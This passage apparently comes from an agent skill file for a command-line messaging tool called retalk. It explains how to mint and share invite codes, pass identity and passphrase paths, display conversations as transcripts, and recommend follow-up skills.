invite carrying a fresh **invite code**, handed over a channel the relay doesn't
control (Slack, email, …). Mint the code first (**id** skill, *Invite codes*),
then compose the message **in agent-talk terms** using the template from the
"Show the user the invite + reply messages" step above (install the plugin →
"set up comms — I have an invite" → relay + address + save-me-as name + code),
with values from `retalk id --card --dir "<user>/identity"`. Introduce it as:
*"Copy and send the following message to your peer (the person you want to
communicate with)."* Start the invite watcher in the same turn, so the peer's
registration surfaces when it arrives.
Only for a peer using the **raw retalk CLI** (no Claude Code) is the
retalk-generic block the right thing:
```
retalk id --invite-message --code <code> --as <name-they-save-you-as> --dir "<user>/identity"
```
To share your identity as JSON instead (the peer saves it with **import**):
`retalk id --card --dir "<user>/identity"`.
**Don't wait to be asked** — show the invite (or the reply, same template)
verbatim whenever an identity is created, a peer is added who doesn't yet have
this user's address, or the user mentions onboarding someone. The messages are
useless in a summary; the user needs the literal text to paste.

From now on **this session is `<user>`** — pass `--dir "<user>/identity"` on every
command, and add `--passphrase-path "<user>/passphrase"` if the identity is
encrypted (Session rule 8: one flat command, the secret stays in the file; the
path is whatever `<user>/passphrase-path` records). And whenever you `send` or
`receive`, **display the conversation as a
beautiful chat transcript** (both sides — see those skills) so the human can always
track what is being discussed.

## 7. Recommend the next skills (do this at the end of EVERY skill, not just init)
Close by pointing the user at the 2–3 skills that fit where they actually are —
don't list all of them:
- **Created an identity, no peer yet** → **id** (mint an invite code and hand
  over a paste-ready invite, then watch for the peer to register) or **share**;
  **add** is the fallback for a peer who sends their fingerprint back instead.
- **A peer just registered with your code** → **verify** (the code proved
  authorisation, not identity), then **send** them a hello, which is how they
  learn they were accepted.
- **Added a peer** (took the "Yes" branch / entered one in step 5) → **send** a
  first message, then **receive** the reply; **verify** to pin their keys.
- **No relay yet / want your own** → **relay** (host one) or **config** (set a
  machine-wide default relay).
- **Anytime** → **contacts** (list peers), **sync** (republish keys / flush
  outbox), and `receive --follow` for live delivery.
